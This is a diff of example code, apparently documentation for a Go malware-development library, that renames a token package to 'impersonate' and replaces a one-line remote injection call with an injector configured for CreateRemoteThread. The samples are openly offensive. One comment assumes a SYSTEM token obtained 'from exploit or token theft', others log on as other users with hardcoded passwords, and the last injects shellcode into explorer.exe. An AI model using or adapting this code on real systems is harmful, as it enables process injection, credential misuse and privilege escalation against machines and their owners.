@@ -222,13 +222,13 @@ import (
     "log"
 
     "github.com/oioio-space/maldev/process/session"
-    "github.com/oioio-space/maldev/win/token"
+    "github.com/oioio-space/maldev/win/impersonate"
 )
 
 func main() {
     // Assume we have a SYSTEM token from exploit or token theft
-    t, err := token.LogonUser("targetuser", "DOMAIN", "password",
-        token.LOGON32_LOGON_INTERACTIVE, token.LOGON32_PROVIDER_DEFAULT)
+    t, err := impersonate.LogonUserW("targetuser", "DOMAIN", "password",
+        impersonate.LOGON32_LOGON_INTERACTIVE, impersonate.LOGON32_PROVIDER_DEFAULT)
     if err != nil {
         log.Fatal(err)
     }
@@ -282,12 +282,12 @@ import (
     "os"
 
     "github.com/oioio-space/maldev/process/session"
-    "github.com/oioio-space/maldev/win/token"
+    "github.com/oioio-space/maldev/win/impersonate"
 )
 
 func main() {
-    t, err := token.LogonUser("admin", ".", "P@ssw0rd",
-        token.LOGON32_LOGON_INTERACTIVE, token.LOGON32_PROVIDER_DEFAULT)
+    t, err := impersonate.LogonUserW("admin", ".", "P@ssw0rd",
+        impersonate.LOGON32_LOGON_INTERACTIVE, impersonate.LOGON32_PROVIDER_DEFAULT)
     if err != nil {
         log.Fatal(err)
     }
@@ -333,8 +333,15 @@ func main() {
         log.Fatal("explorer.exe not found")
     }
 
-    err = inject.Remote(procs[0].PID, shellcode, nil)
+    injector, err := inject.NewInjector(&inject.Config{
+        Method: inject.MethodCreateRemoteThread,
+        PID:    int(procs[0].PID),
+    })
     if err != nil {
+        log.Fatal(err)
+    }
+
+    if err := injector.Inject(shellcode); err != nil {
         log.Fatal(err)
     }
 }
